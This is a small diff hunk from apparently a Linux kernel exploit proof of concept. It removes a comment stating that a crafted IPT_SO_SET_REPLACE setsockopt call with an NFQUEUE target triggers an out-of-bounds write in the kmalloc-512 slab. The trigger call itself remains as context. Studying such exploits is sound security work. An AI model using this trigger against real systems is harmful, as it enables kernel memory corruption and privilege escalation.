@@ -44,8 +44,6 @@ int main(int argc, char *argv[]) {
   strcpy(data.target.u.user.name, "NFQUEUE");
   data.target.u.user.revision = 1;
 
-  // Trigger Out-Of-Bounds write in kmalloc-512 (offset 0x200-0x204 overwritten
-  // with zeros).
   if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)) != 0) {
     if (errno == ENOPROTOOPT)
       err(1, "Error: ip_tables module is not loaded");
